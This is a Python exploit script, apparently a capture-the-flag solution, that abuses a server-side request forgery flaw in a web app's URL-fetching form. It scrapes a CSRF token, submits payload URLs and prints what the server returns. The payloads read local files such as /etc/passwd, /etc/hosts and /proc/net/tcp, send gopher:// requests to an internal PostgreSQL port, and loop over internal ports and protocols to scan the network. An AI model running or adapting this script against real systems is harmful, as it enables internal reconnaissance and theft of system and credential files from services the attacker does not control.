import requests
import re
import time

URL = 'http://100.100.0.5:8080/'

req = requests.Session()


def getCsrfToken():
    res = req.get(URL)
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'csrfmiddlewaretoken" value="(.*?)">', html)
        if m and len(m) > 0:
            return m[0]


def postUrl(url):
    data = {
        "url": url,
        "csrfmiddlewaretoken": getCsrfToken()
    }
    res = req.post(URL, data=data)
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        p = html.find('<!-- Optional JavaScript -->')
        m = re.findall(
            r'<img src="(.*?)" width="200"', html[p-150:p])
        if m and len(m) > 0:
            res = req.get(URL+m[0])
            if res.status_code == 200:
                html = res.content.decode('utf-8')
                print(html)


if __name__ == '__main__':
    # pl = 'http://127.0.0.1:8000/'
    # pl = 'http://172.18.0.4'  # Nginx
    # pl = 'http://172.18.0.4:8080'  # Index
    # pl = 'http://172.18.0.1:8080'  # Index
    # pl = 'http://172.18.0.4'
    # pl = 'http://172.18.0.5'
    pl = 'file:///proc/net/arp'
    # pl = "file:///etc/passwd"
    # dict file ftp ftps gopher http https imap imaps
    # ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
    # pl = "http://127.0.0.11:46801"
    pl = 'file:///proc/net/udp'
    # pl = 'file:///proc/mounts'
    # pl = 'ftp://ftp:ftp@127.0.0.11:46801/'
    # pl = 'file:///proc/1/cmdline'
    # pl = "file:///etc/resolv.conf"
    # pl = 'file:///etc/nginx/site-anable/default.conf'
    # for i in ["dict", "file", "ftp", "ftps", "gopher", "http", "https",\
    #  "imap", "imaps", "ldap", "ldaps", "pop3", "pop3s", "rtsp", "smb", \
    #  "smbs", "smtp", "smtps", "telnet", "tftp"]:
    #     print("%s://127.0.0.11:46801" % i)
    #     postUrl("%s://127.0.0.11:46801" % i)
    # for i in range(1, 100):
    #     pl = 'file:///proc/%d/stat' % i
    #     print(pl)
    #     postUrl(pl)
    #     time.sleep(0.05)
    #     req = requests.Session()
    # pl = 'file:///proc/2/cmdline'
    # pl = "http://172.18.0.4:80"
    pl = "http://127.0.0.11:46801"
    pl = "gopher://172.18.0.2:5432"
    # pl = 'http://127.0.0.1:45556'
    # 172.18.0.2:5432
    # 100.100.19.75:11111
    pl = 'file:///proc/net/tcp'
    # pl = 'file:///proc/net/udp'
    # pl = 'gopher://172.18.0.4:80/_GET / HTTP 1.1%0a%0dHost: '
    pl = 'gopher://172.18.0.2:8000'
    pl = 'file:///etc/hosts'
    postUrl(pl)
    # for i in range(80, 1000):
    #     pl = 'http://172.18.0.2:%d' % i
    #     postUrl(pl)
    #     time.sleep(0.05)
    #     req = requests.Session()
